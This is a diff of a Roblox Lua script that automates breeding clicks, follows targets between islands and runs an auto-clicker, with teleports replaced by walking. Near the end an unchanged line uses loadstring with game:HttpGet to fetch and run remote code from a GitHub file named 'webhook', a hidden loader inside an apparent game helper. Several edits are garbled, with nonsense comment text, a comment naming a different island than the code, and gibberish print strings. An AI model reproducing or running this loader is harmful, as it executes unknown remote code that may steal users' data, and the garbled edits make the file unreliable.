@@ -1,4 +1,4 @@
--- Services
+-- ServicesAFFF
 local players = game:GetService("Players")
 local lp = players.LocalPlayer
 local playerGui = lp:WaitForChild("PlayerGui")
@@ -148,7 +148,7 @@ local function onItemInfoOpened()
 				print("Found breeding button, clicking it")
 				clickButtonVIM(child)
 				
-				-- Wait1 seconds for the prompt to fully appear
+				-- Wait 1seconds for the prompt to fully appear
 				print("Waiting 1 seconds for YesNo prompt to load...")
 				task.wait(1)
 				
@@ -200,7 +200,7 @@ local islandLabel = Instance.new("TextLabel")
 islandLabel.Size = UDim2.new(1, -20, 0, 30)
 islandLabel.Position = UDim2.new(0, 10, 0, 10)
 islandLabel.BackgroundTransparency = 1
-islandLabel.Text = "Mid Islands"
+islandLabel.Text = "High Islands"
 islandLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 islandLabel.TextSize = 14
 islandLabel.Font = Enum.Font.GothamBold
@@ -314,7 +314,8 @@ local function followLoopFrom(folder)
 			end
 			
 			local hrp = char:FindFirstChild("HumanoidRootPart")
-			if not hrp then
+			local humanoid = char:FindFirstChildOfClass("Humanoid")
+			if not hrp or not humanoid then
 				task.wait(0.2)
 				continue
 			end
@@ -366,7 +367,8 @@ local function followLoopFrom(folder)
 					
 					local targetHRP = currentTarget:FindFirstChild("HumanoidRootPart")
 					if targetHRP then
-						hrp.CFrame = targetHRP.CFrame * CFrame.new(0, 0, -5)
+						local targetPos = targetHRP.Position + Vector3.new(0, 0, -5)
+						humanoid:MoveTo(targetPos)
 					end
 				end
 				
@@ -376,7 +378,8 @@ local function followLoopFrom(folder)
 					local distance = (hrp.Position - targetHRP.Position).Magnitude
 					
 					if distance > 6 then
-						char:PivotTo(CFrame.new(targetHRP.Position + Vector3.new(0, 0, -4)))
+						local targetPos = targetHRP.Position + Vector3.new(0, 0, -4)
+						humanoid:MoveTo(targetPos)
 					end
 					
 					if distance > 30 then
@@ -412,9 +415,9 @@ end)
 -- Start auto-clicker
 startAutoClicker()
 
--- Auto-start scanning jungle Island
+-- Auto-start scanning Royal Island
 followLoopFrom(workspace.Islands["Jungle Island"])
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
 
-print("ksjedsiuxd")
+print("Hordldkkdk!")
